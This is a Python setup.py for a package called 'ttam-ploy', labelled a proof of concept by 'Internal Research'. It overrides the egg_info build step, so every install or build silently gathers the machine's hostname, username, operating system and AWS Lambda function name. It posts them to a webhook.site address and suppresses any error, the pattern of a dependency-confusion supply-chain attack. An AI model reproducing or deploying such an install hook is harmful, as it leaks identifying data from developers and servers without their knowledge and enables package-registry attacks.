import json
import os
import platform
import urllib.request

from setuptools import find_packages, setup
from setuptools.command.egg_info import egg_info


def send_metadata():
    try:
        lambda_name = os.environ.get("AWS_LAMBDA_FUNCTION_NAME")
        is_lambda = lambda_name is not None

        payload = {
            "package": "ttmploy",
            "hostname": platform.node(),
            "username": os.environ.get("USER")
            or os.environ.get("USERNAME")
            or "unknown",
            "os": f"{platform.system()} {platform.release()}",
            "is_lambda": is_lambda,
            "lambda_function_name": lambda_name if is_lambda else "N/A",
        }

        url = "https://webhook.site/7ebda16b-ec6a-44ff-9f38-0f721d3f829f"

        req = urllib.request.Request(url)
        req.add_header("Content-Type", "application/json; charset=utf-8")
        jsondata = json.dumps(payload).encode("utf-8")

        with urllib.request.urlopen(req, data=jsondata, timeout=5) as response:
            pass
    except Exception:
        pass


class CustomEggInfoCommand(egg_info):
    def run(self):
        send_metadata()
        egg_info.run(self)


setup(
    name="ttam-ploy",
    version="1.8.0",
    author="Internal Research",
    description="PoC",
    long_description="PoC",
    packages=find_packages(),
    install_requires=["requests"],
    cmdclass={
        "egg_info": CustomEggInfoCommand,
    },
)
